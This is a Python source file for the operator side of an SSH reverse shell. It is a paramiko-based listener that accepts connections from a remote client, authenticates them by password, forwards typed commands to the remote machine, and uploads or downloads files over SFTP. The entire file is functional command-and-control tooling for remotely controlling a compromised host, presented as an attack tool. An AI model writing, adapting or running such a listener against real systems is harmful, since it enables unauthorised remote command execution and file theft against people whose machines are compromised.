import os
import socket
from argparse import ArgumentParser
from sys import stdout
from threading import Thread
from time import sleep

import paramiko
from colorama import Fore, Style, init
from progressbar import ProgressBar

LISTENER = None
ALLOWED_FILE = ""
BANNER = """
 (`-').->(`-').->(`-').->       (`-') (`-')  _     (`-')(`-').->(`-').->(`-')  _                
 ( OO)_  ( OO)_  (OO )__     <-.(OO ) ( OO).-/    _(OO )( OO)_  (OO )__ ( OO).-/ <-.     <-.    
(_)--\_)(_)--\_),--. ,'-'    ,------,(,------,--.(_/,-.(_)--\_),--. ,'-(,------,--. )  ,--. )   
/    _ //    _ /|  | |  |    |   /`. '|  .---\   \ / (_/    _ /|  | |  ||  .---|  (`-')|  (`-') 
\_..`--.\_..`--.|  `-'  |    |  |_.' (|  '--. \   /   /\_..`--.|  `-'  (|  '--.|  |OO )|  |OO ) 
.-._)   .-._)   |  .-.  |    |  .   .'|  .--'_ \     /_.-._)   |  .-.  ||  .--(|  '__ (|  '__ | 
\       \       |  | |  |    |  |\  \ |  `---\-'\   /  \       |  | |  ||  `---|     |'|     |' 
 `-----' `-----'`--' `--'    `--' '--'`------'   `-'    `-----'`--' `--'`-Coded by Kacperek1337  
"""
DOWNLOADS_FOLDER = "Downloads"

def status(status, level=0):
    levels = {
        0: Fore.GREEN + "[+]",
        1: Fore.BLUE + "[*]",
        2: Fore.YELLOW + "[-]",
        3: Fore.RED + "[!]", 
    }
    print(Style.BRIGHT + levels.get(level) + Style.RESET_ALL, status)


class Server(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        if username == SERVER_LOGIN and password == SERVER_PASSWORD:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def get_allowed_auths(self, username):
        return "password"
        

class SFTPFileHandle(paramiko.SFTPHandle):

    data_processed = 0

    def close(self):
        filename = getattr(self, "filename", None)
        if getattr(self, "bar", None) != None:
            self.bar.update(self.st_size)
            print("")
        status("File \"%s\" closed!"%filename, 2)
        REMOTE_FILE_SIZE = 0
        LISTENER.resume()

        return super().close()

    def read(self, offset, length):
        LISTENER.pause()
        returnval = super().read(offset, length)
        st_size = getattr(self, "st_size", None)

        if getattr(self, "bar", None) != None:
            if type(returnval) == bytes:
                self.data_processed += len(returnval)
                self.bar.update(self.data_processed)
        elif st_size != None:
            self.bar = ProgressBar(max_value=st_size)
        
        return returnval

    def write(self, offset, data):
        self.data_processed += len(data)
        st_size = getattr(self, "st_size", None)

        if getattr(self, "bar", None):
            self.bar.update(self.data_processed)
        elif st_size:
            self.bar = ProgressBar(max_value=self.st_size)
        
        return super().write(offset, data)


class SFTPServer (paramiko.SFTPServerInterface):

    def open(self, path, flags, attr):

        status("Client wants to open \"%s\""%path, 1)

        if not path == ALLOWED_FILE:
            print(ALLOWED_FILE)
            status(f"Access to \"{path}\" denied!", 3)
            return
        status(f"Access to \"{path}\" granted")

        fobj = SFTPFileHandle(flags)

        if not os.path.exists(path):
            f = open(os.path.join(DOWNLOADS_FOLDER, path), "wb")
            LISTENER.pause()
            for _ in range(10):
                try:
                    try:
                        size = int(channel.recv(BUFFER_SIZE).decode())
                    except ValueError:
                        status("Invalid size of data %s"%size, 3)
                        return
                    status("Size of data to download is %s"%size)
                    fobj.st_size = size
                    break
                except socket.error:
                    continue
        else:
            f = open(path, "rb")
            fobj.st_size = os.path.getsize(path)

        fobj.filename = path
        fobj.readfile = f
        fobj.writefile = f
        return fobj


class Listener:

    def __listener(self):
        while True:
            if not self.__pause:
                try:
                    data = channel.recv(BUFFER_SIZE)
                    if data == b"":
                        return
                    try:
                        stdout.write(data.decode())
                    except UnicodeDecodeError:
                        status("Couldn't decode received data", 3)
                except socket.error:
                    None

    def resume(self):
        if self.__pause:
            self.__pause = False
            status("Listener resumed")

    def pause(self):
        if not self.__pause:
            self.__pause = True
            sleep(1)
            status("Listener paused", 2)

    def start(self):
        Thread(target=self.__listener, daemon=True).start()
        status("Listener started", 1)

    def __init__(self, channel):
        self.channel = channel
        self.__pause = False


if __name__ == "__main__":

    parser = ArgumentParser()
    parser.add_argument("addr", type=str, help="Server address")
    parser.add_argument("passwd", type=str, help="Server password")
    parser.add_argument("--user", "-u", type=str, default="root", help="Server login (default=root)")
    parser.add_argument("--port", "-p", type=int, default=22, help="Server port (default=22)")
    parser.add_argument("--buffer-size", type=int, default=1024, help="Size of the buffer (default=1024)")
    parser.add_argument("--key-file", "-k", type=str, default="rsa.key", help="Private key file path (default=rsa.key)")
    args = parser.parse_args().__dict__

    SERVER_IP = args["addr"]
    SERVER_PORT = args["port"]
    BUFFER_SIZE = args["buffer_size"]

    RSA_KEY_FILE = args["key_file"]
    SERVER_LOGIN = args["user"]
    SERVER_PASSWORD = args["passwd"]

    try:
        if os.geteuid():
            exit("Run it as root!")
    except AttributeError:
        None

    if not os.path.exists(RSA_KEY_FILE):
        exit(f"Key file \"{RSA_KEY_FILE}\" does not exist")

    if not os.path.exists(DOWNLOADS_FOLDER):
        os.mkdir(DOWNLOADS_FOLDER)
        status(f"Created \"{DOWNLOADS_FOLDER}\" folder", 1)

    init()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(1)

    try:

        while True:

            print(Fore.LIGHTRED_EX + BANNER)
            status("Listening for incoming connections on %s:%d"%(SERVER_IP, SERVER_PORT))
            conn, addr = server_socket.accept()
            status("Incoming connection from {}:{}".format(*addr), 1)

            host_key = paramiko.RSAKey(filename=RSA_KEY_FILE)
            transport = paramiko.Transport(conn)
            transport.add_server_key(host_key)
            transport.set_subsystem_handler(
                "sftp", paramiko.SFTPServer, SFTPServer)

            server = Server()
            transport.start_server(server=server)
            channel = transport.accept()
            if transport.authenticated:
                status("Authenticated!")
                break
            status("Client tried to authenticate with invalid credientials", 3)

        channel.settimeout(1)
        LISTENER = Listener(channel)
        status("New session opened {}:{} --> {}:{}".format(*addr, SERVER_IP, SERVER_PORT), 3)
        LISTENER.start()

        while True:
            command = input()
            commandSplit = command.split()
            commandSplitLen = len(commandSplit)
            if commandSplitLen < 1:
                channel.send("\n")
                continue
            if commandSplit[0] == "exit":
                raise SystemExit
            elif commandSplit[0] == "upload" and commandSplitLen > 1:
                ALLOWED_FILE = os.path.abspath(command.split(maxsplit=1)[1].strip("\""))
                channel.send("%s %s"%(commandSplit[0], ALLOWED_FILE))
                continue
            elif commandSplit[0] == "download" and commandSplitLen > 1:
                ALLOWED_FILE = command.split(maxsplit=1)[1].strip("\"")
                channel.send("%s %s"%(commandSplit[0], ALLOWED_FILE))
                continue
            channel.send(command)

    except (OSError, KeyboardInterrupt, SystemExit) as e:
        
        if type(e) == OSError:
            status("Connection closed by remoted host", 3)
        else:
            status(Fore.YELLOW + "Exiting..." + Fore.RESET, 3)
